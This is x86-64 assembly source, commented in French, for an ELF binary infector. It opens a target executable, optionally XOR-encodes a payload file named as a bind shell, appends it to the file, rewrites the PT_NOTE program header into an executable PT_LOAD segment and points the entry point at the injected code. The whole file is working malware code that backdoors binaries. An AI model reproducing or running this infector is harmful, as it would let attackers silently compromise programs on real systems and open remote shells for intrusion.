section .data
	vmagicnum db 0x7f, 0x45, 0x4c, 0x46
	nomelf db "simple", 0
	payload_name db "bind_shell.bin", 0

    xor_key equ 0x5A
section .bss
	elfheader resb 64

	recup_e_entry resq 1
	recup_e_phoff resq 1
	recup_e_phentsize resw 1
	recup_phnum resw 1

	elfdata resb 4096
	pt_note_sav resq 1
	pt_load_sav resq 1
	last_load_end resq 1

	pt_note_offset resq 1

	p_flags resd 1
	p_offset resq 1
	p_vaddr resq 1
	p_filesz resq 1
	p_memsz resq 1
	p_align resq 1

	espace_disponible resq 1

	new_e_entry resq 1

	new_p_type resd 1
	new_p_flags resd 1
	new_p_offset resq 1
	new_p_vaddr resq 1
	new_p_paddr resq 1
	new_p_filesz resq 1
	new_p_memsz resq 1
	new_p_align resq 1

	payload_size resq 1
	payload_buffer resb 4096
	program_header_buff resb 56

	xor_buffer resb 4096
	

section .text

global _start

_start:
	mov rax, [rsp]          ; Nombre d'argument argc
    cmp rax, 4
    jne erreur

    

    mov rax, 2              ; Ouvrir le fichier
	mov rdi, [rsp + 16]     ; argv[0] nom du fichier executé, argv[1] = nom du fichier ELF
    mov rsi, 2              ; Droit Lecture ecriture
    mov rdx, 0
    syscall
	
	cmp rax, 0
	jl erreur

	cmp rax, 2
	jbe erreur

	mov r8, rax			; Sauvegarder le fd

	mov rax, 0
	mov rdi, r8
	mov rsi, elfheader
	mov rdx, 64
	syscall				; Lire l'ELF Header

	cmp rax, 64
	jne erreur

	mov eax, [elfheader]
	cmp eax, [vmagicnum]
	jne erreur			; Vérifier le magic ELF

	cmp byte [elfheader + 4], 2
	jne erreur                    ; ELFCLASS64 = 0x02

	cmp byte [elfheader + 5], 1
	jne erreur                    ; little endian = 0x01

	cmp word [elfheader + 0x12], 0x3E
	jne erreur                    ; EM_X86_64 = 0x3E

	mov rax, [elfheader + 0x18]
	mov [recup_e_entry], rax	; Récupérer e_entry

	mov rax, [elfheader + 0x20]
	mov [recup_e_phoff], rax	; Récupérer e_phoff

	mov ax, [elfheader + 0x36]
	mov [recup_e_phentsize], ax	; Récupérer e_phentsize

	cmp word [recup_e_phentsize], 56 	; Size e_phentsize = 56
	jne erreur

	mov ax, [elfheader + 0x38]
	mov [recup_phnum], ax		; Récupérer e_phnum

	mov rax, 0
	mov rdi, r8
	mov rsi, elfdata
	mov rdx, 4096
	syscall				; Lire les Program Headers

	cmp rax, 0
	jl erreur

	mov rcx, 0			; i = 0

boucle_proghead:
	movzx rdx, word [recup_phnum]
	cmp rcx, rdx
	jae fin_recherche		; Si i >= e_phnum, terminer

	mov rax, [recup_e_phoff]	; RAX = e_phoff et size = 64
	cmp rax, 64
	jb erreur


	movzx rdx, word [recup_e_phentsize]
	imul rdx, rcx			; RDX = i * e_phentsize

	add rax, rdx			; RAX = e_phoff + i * e_phentsize
	sub rax, 64			; elfdata commence à l'offset 64

	mov edx, [elfdata + rax]	; Récupérer p_type

	cmp edx, 4
	je pt_note_trouve		; PT_NOTE = 4

	cmp edx, 1
	je pt_load_trouve		; PT_LOAD = 1

	inc rcx
	jmp boucle_proghead

pt_note_trouve:
	cmp qword [pt_note_sav], 0
	jne suite_boucle		; Ne garder que le premier PT_NOTE

	mov [pt_note_sav], rax		; Sauvegarder sa position dans elfdata

	mov rdx, [recup_e_phoff]
	mov rax, rcx
	movzx rsi, word [recup_e_phentsize]
	imul rsi, rax
	add rdx, rsi
	mov [pt_note_offset], rdx	; Sauvegarder son offset fichier

	jmp suite_boucle

pt_load_trouve:
	mov [pt_load_sav], rax		; Sauvegarder le PT_LOAD

	mov edx, [elfdata + rax + 4]
	mov [p_flags], edx		; Récupérer p_flags

	mov rdx, [elfdata + rax + 8]
	mov [p_offset], rdx		; Récupérer p_offset

	mov rdx, [elfdata + rax + 16]
	mov [p_vaddr], rdx		; Récupérer p_vaddr

	mov rdx, [elfdata + rax + 32]
	mov [p_filesz], rdx		; Récupérer p_filesz

	mov rdx, [elfdata + rax + 40]
	mov [p_memsz], rdx		; Récupérer p_memsz

	mov rdx, [elfdata + rax + 48]
	mov [p_align], rdx		; Récupérer p_align

	mov rax, [p_memsz]
	cmp rax, [p_filesz]
	jb erreur 				; Verifie si p_memsz >= p_filesz

	mov rax, [p_memsz]
	sub rax, [p_filesz]
	mov [espace_disponible], rax	; Calculer espace mémoire disponible

	mov rax, [p_vaddr]
	add rax, [p_memsz]
	add rax, 0x1000
	and rax, ~0xFFF			; Aligner sur 0x1000

	cmp rax, [last_load_end]
	jle suite_boucle

	mov [last_load_end], rax	; Conserver la plus grande adresse

	jmp suite_boucle

suite_boucle:
	inc rcx
	jmp boucle_proghead

fin_recherche:

	cmp qword [pt_note_sav], 0 		; Verifie si minimum 1 PT_NOTE trouvé
	je erreur

	cmp qword [pt_load_sav], 0 	 	; Verifie si minimum 1 PT_LOAD trouvé
	je erreur

	mov r13, [last_load_end]
	add r13, 0x1000
	and r13, ~0xFFF			; Nouvelle adresse virtuelle alignée

	mov rax, 8
	mov rdi, r8
	mov rsi, 0
	mov rdx, 2
	syscall				; Aller à la fin du fichier

	cmp rax, 0
	jl erreur

	mov r12, rax			; R12 = offset de fin du fichier


	mov r15, [rsp + 32] 		; A déchiffrer oui ou non

		

	mov rax, 2
	mov rdi, [rsp + 24] 		; payload_name exemple binshell
	mov rsi, 2
	mov rdx, 0
	syscall		; Ouvre le payload

	cmp rax, 0
	jl erreur

	cmp rax, 2
	jbe erreur

	mov r9, rax
	
	cmp byte [r15], '0'  		; 0 on ne convertit pas en xor 1 on convertit en xor
	je not_xor

	mov rax, 8
	mov rdi, r9
	mov rsi, 0
	mov rdx, 0
	syscall

	cmp rax, 0
	jl erreur

    mov     rax, 0              
    mov     rdi, r9           
    mov     rsi, xor_buffer
    mov     rdx, 4096       ; Lecture du shell
    syscall

    cmp rax, 0
    jl erreur
    jz not_xor        ; Si vide quitter

    mov r14, rax 

    xor rcx, rcx  

xor_loop:

    cmp rcx, r14
    jge write_output

    xor byte [xor_buffer + rcx], xor_key        ; Modifie avec xor octet par octet

    inc rcx
    jmp xor_loop

write_output:

	mov rax, 3
	mov rdi, r9
	syscall

	xor r9, r9

	mov rax, 2                 
    mov rdi, [rsp + 24]
    mov rsi, 2 | 512              
    mov rdx, 0
    syscall 			; Ouvrir en ecrasant

    cmp rax, 0
    jl erreur

	mov r9, rax

    mov     rax, 1              ; Ecrire dans le payload
    mov     rdi, r9
    mov     rsi, xor_buffer
    mov     rdx, r14
    syscall

    cmp rax, 0
    jl erreur

    jmp not_xor

not_xor:

	cmp rax, 0
    jl erreur           ; Vérifie si lseek a échoué

	mov rax, 0
	mov rdi, r9
	mov rsi, payload_buffer
	mov rdx, 4096
	syscall 		; Lit le payload pour compter le nombre d'octet

	cmp rax, 0
	jle erreur

	mov [payload_size], rax

	mov rax, 3
	mov rdi, r9
	syscall 		;ferme l'ouverture du payload

preparation_PT_LOAD:
	mov dword [new_p_type], 1	; PT_LOAD

	mov dword [new_p_flags], 5	; PF_R | PF_X

	mov rax, r12
	add rax, 0xFFF
	and rax, ~0xFFF
	mov [new_p_offset], rax		; Offset du payload dans le fichier

	mov [new_p_vaddr], r13		; Adresse virtuelle du payload

	mov rax, [new_p_vaddr]
	mov [new_p_paddr], rax		; Adresse physique

	mov rax, [payload_size]
	mov [new_p_filesz], rax		; Taille du payload dans le fichier

	mov rax, [new_p_filesz]
	mov [new_p_memsz], rax		; Taille du payload en mémoire

	mov rax, [p_align]
	mov [new_p_align], rax		; Même alignement que les PT_LOAD existants

	mov rax, [new_p_vaddr]
	mov [new_e_entry], rax		; Nouveau point d'entrée

	mov rax, 8
	mov rdi, r8
	mov rsi, 24
	mov rdx, 0
	syscall				; Aller à l'offset e_entry

	cmp rax, 0
	jl erreur

	mov rax, 1
	mov rdi, r8
	mov rsi, new_e_entry
	mov rdx, 8
	syscall				; Écrire le nouvel e_entry

	cmp rax, 8
	jne erreur

	mov dword [program_header_buff], 1	; p_type = PT_LOAD

	mov r9d, [new_p_flags]
	mov dword [program_header_buff + 4], r9d	; p_flags

	mov r9, [new_p_offset]
	mov qword [program_header_buff + 8], r9		; p_offset

	mov r9, [new_p_vaddr]
	mov qword [program_header_buff + 16], r9	; p_vaddr

	mov r9, [new_p_paddr]
	mov qword [program_header_buff + 24], r9	; p_paddr

	mov r9, [payload_size]
	mov qword [program_header_buff + 32], r9	; p_filesz

	mov r9, [payload_size]
	mov qword [program_header_buff + 40], r9	; p_memsz

	mov r9, [new_p_align]
	mov qword [program_header_buff + 48], r9	; p_align

	mov rax, 8
	mov rdi, r8
	mov rsi, [pt_note_offset]
	mov rdx, 0
	syscall				; Aller à l'ancien PT_NOTE

	cmp rax, 0
	jl erreur

	mov rax, 1
	mov rdi, r8
	mov rsi, program_header_buff
	mov rdx, 56
	syscall				; Remplacer PT_NOTE par PT_LOAD

	cmp rax, 56
	jne erreur

	mov rax, 8 			; Aller à l'emplacement du payload
	mov rdi, r8
	mov rsi, [new_p_offset]
	mov rdx, 0
	syscall				; SEEK_SET vers new_p_offset

	cmp rax, 0
	jl erreur

	; Écrire le payload dans simple
	mov rax, 1
	mov rdi, r8
	mov rsi, payload_buffer
	mov rdx, [payload_size]
	syscall				; Écrire le payload

	cmp rax, [payload_size]
	jne erreur

	mov rax, 3
	mov rdi, r8
	syscall				; Fermer le fichier

	mov rax, 60
	mov rdi, 0
	syscall				; Quitter proprement

erreur:
	mov rax, 60
	mov rdi, 2
	syscall				; Quitter avec erreur